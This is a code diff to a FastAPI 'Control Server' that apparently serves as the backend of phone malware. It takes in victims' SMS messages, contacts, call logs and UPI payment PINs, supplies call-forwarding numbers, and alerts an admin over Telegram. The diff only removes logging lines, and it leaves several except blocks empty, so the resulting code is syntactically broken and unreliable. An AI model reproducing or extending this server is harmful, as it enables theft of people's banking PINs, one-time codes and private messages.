@@ -4,7 +4,7 @@ from fastapi.responses import JSONResponse
 from starlette.websockets import WebSocketDisconnect as StarletteWebSocketDisconnect
 from datetime import datetime, timedelta
 import json
-import logging
+
 import asyncio
 from typing import Optional
 
@@ -51,11 +51,6 @@ from .utils.auth_middleware import (
 from .services.otp_service import otp_service
 from .services.auth_service import ENABLE_2FA
 
-logging.basicConfig(
-    level=logging.INFO if settings.DEBUG else logging.WARNING,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-)
-logger = logging.getLogger(__name__)
 
 app = FastAPI(
     title=" Control Server",
@@ -74,16 +69,15 @@ app.add_middleware(
 
 @app.on_event("startup")
 async def startup_event():
-    logger.info("🚀 Starting Control Server...")
+
     await connect_to_mongodb()
     await auth_service.create_default_admin()
-    logger.info("✅ Server is ready!")
 
 @app.on_event("shutdown")
 async def shutdown_event():
-    logger.info("🛑 Shutting down server...")
+
     await close_mongodb_connection()
-    logger.info("👋 Server stopped!")
+
 @app.post("/devices/heartbeat")
 async def device_heartbeat(request: Request):
     
@@ -108,7 +102,7 @@ async def device_heartbeat(request: Request):
         return {"success": True, "message": "Heartbeat received"}
         
     except Exception as e:
-        logger.error(f"❌ Heartbeat error: {e}")
+
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/ping-response")
@@ -120,16 +114,14 @@ async def ping_response(request: Request):
         
         if not device_id:
             raise HTTPException(status_code=400, detail="deviceId required")
-        
-        logger.info(f"✅ Ping response: {device_id}")
-        
+
         await device_service.update_online_status(device_id, True)
         await device_service.add_log(device_id, "ping", "Ping response received", "success")
         
         return {"success": True, "message": "Ping response received"}
         
     except Exception as e:
-        logger.error(f"❌ Ping response error: {e}")
+
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/upload-response")
@@ -144,9 +136,7 @@ async def upload_response(request: Request):
         
         if not device_id or not status:
             raise HTTPException(status_code=400, detail="device_id and status required")
-        
-        logger.info(f"📊 Upload response: {device_id} - {status} ({count})")
-        
+
         upload_type = "SMS" if "sms" in status.lower() else "Contacts" if "contacts" in status.lower() else "Unknown"
         log_message = f"{upload_type} upload: {count} items"
         if error:
@@ -175,7 +165,7 @@ async def upload_response(request: Request):
         return {"success": True, "message": "Upload response received"}
         
     except Exception as e:
-        logger.error(f"❌ Upload response error: {e}")
+
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/register")
@@ -203,8 +193,7 @@ async def register_device(message: dict, background_tasks: BackgroundTasks):
             device_info,
             admin_token
         )
-        logger.info(f"📱 Registration notifications queued for {admin_username}")
-    
+
     return {"status": "success", "message": "Device registered successfully", "device_id": device_id}
 
 @app.post("/battery")
@@ -269,7 +258,6 @@ async def call_history(message: dict):
 async def receive_sms(request: Request):
     try:
         data = await request.json()
-        logger.info(f"📱 SMS request received: {data}")
 
         device_id = data.get("device_id") or data.get("deviceId")
         
@@ -284,18 +272,16 @@ async def receive_sms(request: Request):
             timestamp = data.get("timestamp")
         
         if not device_id:
-            logger.error("❌ Missing device_id in SMS request")
+
             raise HTTPException(status_code=400, detail="device_id is required")
 
         if not sender or not message:
-            logger.error(f"❌ Missing sender or message for device: {device_id}")
-            raise HTTPException(status_code=400, detail="sender and message are required")
 
-        logger.info(f"📨 SMS from {sender} to device {device_id}: {message[:50]}...")
+            raise HTTPException(status_code=400, detail="sender and message are required")
 
         device = await device_service.get_device(device_id)
         if not device:
-            logger.warning(f"⚠️ Device not found: {device_id}, creating...")
+
             await device_service.register_device(device_id, {
                 "device_name": "Unknown Device",
                 "registered_via": "sms_endpoint"
@@ -311,7 +297,6 @@ async def receive_sms(request: Request):
         }
 
         await device_service.save_new_sms(device_id, sms_data)
-        logger.info(f"✅ SMS saved for device: {device_id}")
 
         await device_service.add_log(
             device_id,
@@ -327,7 +312,6 @@ async def receive_sms(request: Request):
                     device_id, device.admin_username, sender, message
                 )
         except Exception as tg_error:
-            logger.warning(f"⚠️ Failed to send Telegram notification: {tg_error}")
 
         return {
             "status": "success",
@@ -338,7 +322,7 @@ async def receive_sms(request: Request):
     except HTTPException:
         raise
     except Exception as e:
-        logger.error(f"❌ Unexpected error in receive_sms: {e}", exc_info=True)
+
         raise HTTPException(
             status_code=500,
             detail=f"Internal server error: {str(e)}"
@@ -353,7 +337,7 @@ async def get_forwarding_number_new(device_id: str):
             return {"forwardingNumber": ""}
         return {"forwardingNumber": forwarding_number}
     except Exception as e:
-        logger.error(f"❌ Error fetching forwarding number: {e}")
+
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.get("/health")
@@ -722,7 +706,7 @@ async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
         admin = await mongodb.db.admins.find_one({"device_token": admin_token})
         
         if not admin:
-            logger.warning(f"⚠️ Admin not found for user_id: {admin_token[:20]}...")
+
             admin_username = None
         else:
             admin_username = admin["username"]
@@ -730,7 +714,7 @@ async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
         device = await mongodb.db.devices.find_one({"device_id": pin_data.device_id})
         
         if not device:
-            logger.warning(f"⚠️ Device not found: {pin_data.device_id} - PIN not saved (device must register first)")
+
             raise HTTPException(
                 status_code=404,
                 detail="Device not found. Device must be registered before saving PIN."
@@ -771,8 +755,7 @@ async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
                 device_model
             )
         else:
-            logger.info(f"💳 UPI PIN saved for device: {pin_data.device_id} (no admin association)")
-        
+
         return UPIPinResponse(
             status="success",
             message="PIN saved successfully",
@@ -780,7 +763,7 @@ async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
         )
     
     except Exception as e:
-        logger.error(f"❌ Error saving UPI PIN: {e}")
+
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.get("/auth/me", response_model=AdminResponse)
@@ -1499,7 +1482,6 @@ async def update_device_settings(
             f"Device: {device_id}, Changes: {', '.join(settings_dict.keys())}"
         )
     except Exception as e:
-        logger.warning(f"⚠️ Failed to send Telegram notification: {e}")
 
     await device_service.add_log(device_id, "settings", "Settings updated", "info", settings_dict)
 
@@ -1533,7 +1515,6 @@ async def delete_device_sms(
             f"Deleted {result.deleted_count} SMS messages from device {device_id}"
         )
     except Exception as e:
-        logger.warning(f"⚠️ Failed to send Telegram notification: {e}")
 
     return {
         "success": True,
@@ -1588,7 +1569,7 @@ async def get_device_calls(
         }
 
     except Exception as e:
-        logger.error(f"❌ Failed to get call logs: {e}")
+
         raise HTTPException(status_code=500, detail=str(e))
 
     return {
